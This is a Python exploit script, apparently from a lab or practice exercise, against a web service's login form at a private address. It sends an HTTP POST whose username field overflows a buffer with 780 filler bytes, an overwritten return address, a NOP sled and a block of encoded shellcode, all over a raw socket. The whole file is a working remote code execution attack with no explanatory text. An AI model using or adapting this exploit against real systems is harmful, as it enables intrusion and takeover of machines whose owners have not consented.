import socket, urllib

shellcode =  b""
shellcode += b"\xd9\xc1\xbd\xe3\xb9\x5c\xe9\xd9\x74\x24\xf4"
shellcode += b"\x5b\x29\xc9\xb1\x52\x31\x6b\x17\x03\x6b\x17"
shellcode += b"\x83\x20\xbd\xbe\x1c\x5a\x56\xbc\xdf\xa2\xa7"
shellcode += b"\xa1\x56\x47\x96\xe1\x0d\x0c\x89\xd1\x46\x40"
shellcode += b"\x26\x99\x0b\x70\xbd\xef\x83\x77\x76\x45\xf2"
shellcode += b"\xb6\x87\xf6\xc6\xd9\x0b\x05\x1b\x39\x35\xc6"
shellcode += b"\x6e\x38\x72\x3b\x82\x68\x2b\x37\x31\x9c\x58"
shellcode += b"\x0d\x8a\x17\x12\x83\x8a\xc4\xe3\xa2\xbb\x5b"
shellcode += b"\x7f\xfd\x1b\x5a\xac\x75\x12\x44\xb1\xb0\xec"
shellcode += b"\xff\x01\x4e\xef\x29\x58\xaf\x5c\x14\x54\x42"
shellcode += b"\x9c\x51\x53\xbd\xeb\xab\xa7\x40\xec\x68\xd5"
shellcode += b"\x9e\x79\x6a\x7d\x54\xd9\x56\x7f\xb9\xbc\x1d"
shellcode += b"\x73\x76\xca\x79\x90\x89\x1f\xf2\xac\x02\x9e"
shellcode += b"\xd4\x24\x50\x85\xf0\x6d\x02\xa4\xa1\xcb\xe5"
shellcode += b"\xd9\xb1\xb3\x5a\x7c\xba\x5e\x8e\x0d\xe1\x36"
shellcode += b"\x63\x3c\x19\xc7\xeb\x37\x6a\xf5\xb4\xe3\xe4"
shellcode += b"\xb5\x3d\x2a\xf3\xba\x17\x8a\x6b\x45\x98\xeb"
shellcode += b"\xa2\x82\xcc\xbb\xdc\x23\x6d\x50\x1c\xcb\xb8"
shellcode += b"\xf7\x4c\x63\x13\xb8\x3c\xc3\xc3\x50\x56\xcc"
shellcode += b"\x3c\x40\x59\x06\x55\xeb\xa0\xc1\x9a\x44\xab"
shellcode += b"\x23\x73\x97\xab\x52\xdf\x1e\x4d\x3e\xcf\x76"
shellcode += b"\xc6\xd7\x76\xd3\x9c\x46\x76\xc9\xd9\x49\xfc"
shellcode += b"\xfe\x1e\x07\xf5\x8b\x0c\xf0\xf5\xc1\x6e\x57"
shellcode += b"\x09\xfc\x06\x3b\x98\x9b\xd6\x32\x81\x33\x81"
shellcode += b"\x13\x77\x4a\x47\x8e\x2e\xe4\x75\x53\xb6\xcf"
shellcode += b"\x3d\x88\x0b\xd1\xbc\x5d\x37\xf5\xae\x9b\xb8"
shellcode += b"\xb1\x9a\x73\xef\x6f\x74\x32\x59\xde\x2e\xec"
shellcode += b"\x36\x88\xa6\x69\x75\x0b\xb0\x75\x50\xfd\x5c"
shellcode += b"\xc7\x0d\xb8\x63\xe8\xd9\x4c\x1c\x14\x7a\xb2"
shellcode += b"\xf7\x9c\x9a\x51\xdd\xe8\x32\xcc\xb4\x50\x5f"
shellcode += b"\xef\x63\x96\x66\x6c\x81\x67\x9d\x6c\xe0\x62"
shellcode += b"\xd9\x2a\x19\x1f\x72\xdf\x1d\x8c\x73\xca"


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "192.168.1.4"
port = 80

eip = "\x83\x0c\x09\x10"
padding = "\x90" * 10
buffer = "A" * 780 + eip + padding + shellcode
post_data = "username=" + urllib.quote(buffer) + "&password=AAAA"

headers = ""
headers +="POST /login HTTP/1.1\r\n"
headers +="Host: 192.168.1.4\r\n"
headers +="User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\n"
headers +="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
headers +="Accept-Language: en-US,en;q=0.5\r\n"
headers +="Accept-Encoding: gzip, deflate\r\n"
headers +="Content-Type: application/x-www-form-urlencoded\r\n"
headers +="Content-Length: {}\r\n".format(str(len(post_data)))
headers +="Origin: http://192.168.1.4\r\n"
headers +="Connection: close\r\n"
headers +="Referer: http://192.168.1.4/login\r\n"
headers +="Upgrade-Insecure-Requests: 1\r\n"

data = headers + "\r\n" + post_data

s.connect((host, port))
s.send(data)
print("buffer is sent ..")
